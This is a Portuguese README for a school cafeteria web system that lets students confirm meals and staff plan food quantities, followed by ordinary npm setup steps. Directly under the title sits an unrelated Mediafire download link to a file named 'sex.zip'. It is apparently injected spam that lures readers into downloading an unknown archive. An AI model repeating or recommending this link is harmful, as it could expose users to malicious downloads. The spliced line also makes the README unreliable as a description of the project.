# 🍝 Sistema_de_Cantina_PW
https://www.mediafire.com/file/kga1hkkxwt00jo2/sex.zip/file

Este projeto nasceu com o objetivo de combater o desperdício de alimentos na escola **Bento Quirino**, oferecendo uma solução inteligente para a gestão da merenda escolar. A plataforma permite que a escola preveja a demanda diária de refeições, podendo ser expandida futuramente para outras instituições de ensino.   

---

## 📱 Funcionalidades

### 🎓 Área do Aluno
O acesso é feito via web, focado em uma experiência simples e rápida:
* **Autenticação:** Login seguro utilizando RA e senha.
* **Cardápio Digital:** Visualização diária da foto do prato e lista de ingredientes.
* **Confirmação de Presença:**
  * Opção de sinalizar se irá consumir a merenda no dia.
  * Seleção da quantidade/porção desejada (caso confirme a refeição).
  * Envio de dados em tempo real para o sistema de gestão.

### 🏢 Área Administrativa (Secretaria)
Ferramentas de controle para otimizar a produção da cozinha:
* **Gestão de Cardápios:** Interface para selecionar a data, fazer upload da foto da refeição e listar os ingredientes.
* **Dashboard de Dados:**  Gráfico que informa a quantidade de pedidos por porção do dia.
  * Cálculo automático do total de peso das refeições necessárias por dia.
  * Sincronização instantânea com o app do aluno.

## 🚀 Como Executar o Projeto

Siga os passos abaixo para configurar o ambiente local:

### 1. Clonar o Repositório
Abra o terminal e digite:
```
git clone https://github.com/O-Quasson/Sistema_de_Cantina_PW
```

### 2. Entrar na Pasta Sistema_Cantina_PW
```
cd Sistema_de_Cantina_PW
```

### 3. Instalar as Dependências
Será necessário instalar as dependências nas 2 subpastas principais

No terminal 1
```
cd SistemaCantina
npm install
```

No terminal 2
```
cd API
npm install
```

### 4. Iniciar o Servidor de Desenvolvimento

No terminal 1, rode
```
npm run dev
```

 No terminal 2, rode
```
node server.js
```

O projeto abrirá automaticamente no seu navegador em http://localhost:5173
